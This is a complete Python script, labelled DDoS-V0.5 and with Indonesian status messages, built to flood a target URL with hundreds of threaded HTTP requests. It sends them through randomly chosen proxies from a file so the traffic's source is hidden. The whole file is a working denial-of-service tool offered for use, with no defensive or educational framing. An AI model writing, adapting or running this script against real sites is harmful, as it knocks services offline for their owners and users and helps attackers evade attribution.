import threading
import requests
import sys
import time
import random

MAX_REQUESTS = 700
DURATION = 10  # detik
THREADS = 100

proxies_list = []
try:
    with open("proxies.txt", "r") as f:
        proxies_list = [line.strip() for line in f if line.strip()]
except:
    proxies_list = []

def get_proxy():
    if proxies_list:
        proxy = random.choice(proxies_list)
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    return None

def attack(url):
    try:
        requests.get(url, proxies=get_proxy(), timeout=5)
    except:
        pass

def start_attack(url):
    print("\n[INFO] Proses Mengirim Serangan...")
    threads = []
    start_time = time.time()
    for i in range(MAX_REQUESTS):
        t = threading.Thread(target=attack, args=(url,))
        t.daemon = True
        threads.append(t)
        t.start()
        time.sleep(DURATION / MAX_REQUESTS)
    for t in threads:
        t.join()
    print("[INFO] Selesai Mengirim Serangan.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python DDoS-V0.5.py http://<target>")
    else:
        start_attack(sys.argv[1])